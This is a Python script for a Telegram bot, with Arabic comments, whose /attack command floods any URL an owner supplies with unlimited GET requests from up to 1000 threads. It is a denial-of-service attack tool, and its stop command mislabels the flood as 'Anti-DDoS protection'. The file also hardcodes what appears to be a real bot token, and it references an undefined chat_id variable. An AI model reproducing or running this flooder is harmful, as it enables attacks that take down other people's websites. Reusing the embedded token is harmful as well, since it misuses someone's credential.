
import os
import time
import requests
import logging
import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import telebot

# قائمة المالكين والمستخدمين
Owners = ['6358035274']  # استبدل هذا بمعرف المستخدم الخاص بك
NormalUsers = []

# استبدل 'YOUR_TOKEN_HERE' بالرمز الخاص بك من BotFather
bot = telebot.TeleBot('7287602125:AAH9buxYlFiOo2kAUnkicgmRSo4NSx8lV6w')

# Constants
lock = threading.Lock()
protection_active = False

def send_request(url, method, retries=3):
    for attempt in range(retries):
        try:
            response = requests.request(method, url, timeout=5)
            return response.status_code
        except requests.RequestException:
            if attempt < retries - 1:
                time.sleep(1)
    return None

def flood(url, count, interval, methods):
    total_sent = 0

    with ThreadPoolExecutor(max_workers=1000) as executor:
        futures = []
        while protection_active and (count == -1 or total_sent < count):
            for method in methods:
                futures.append(executor.submit(send_request, url, method))
                total_sent += 1

            if interval > 0:
                time.sleep(interval)

    bot.send_message(chat_id, f"Total requests sent: {total_sent}")

@bot.message_handler(commands=['attack'])
def attack(message):
    user_id = str(message.from_user.id)
    
    if user_id not in Owners:
        bot.reply_to(message, "You are not authorized to execute this command.")
        return

    bot.reply_to(message, "Please send the URL to attack.")

    @bot.message_handler(func=lambda m: m.from_user.id == message.from_user.id)
    def handle_url(msg):
        global protection_active
        url = msg.text
        packet_count = -1  # Infinite requests
        interval = 0  # Fastest
        selected_methods = ["GET"]

        protection_active = True
        methods = [method.strip().upper() for method in selected_methods]
        bot.reply_to(msg, f"Starting flood for {url} with methods: {methods}...")
        flood(url, packet_count, interval, methods)

@bot.message_handler(commands=['stop'])
def stop_protection(message):
    user_id = str(message.from_user.id)
    
    if user_id not in Owners:
        bot.reply_to(message, "You are not authorized to execute this command.")
        return

    global protection_active
    protection_active = False
    bot.reply_to(message, "Stopping Anti-DDoS protection...")

@bot.message_handler(commands=['show_request_log'])
def show_request_log(message):
    user_id = str(message.from_user.id)
    
    if user_id not in Owners:
        bot.reply_to(message, "You are not authorized to execute this command.")
        return

    bot.reply_to(message, "Request log is not available.")

@bot.message_handler(commands=['show_error_log'])
def show_error_log(message):
    user_id = str(message.from_user.id)
    
    if user_id not in Owners:
        bot.reply_to(message, "You are not authorized to execute this command.")
        return

    bot.reply_to(message, "Error log is not available.")

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    bot.polling()
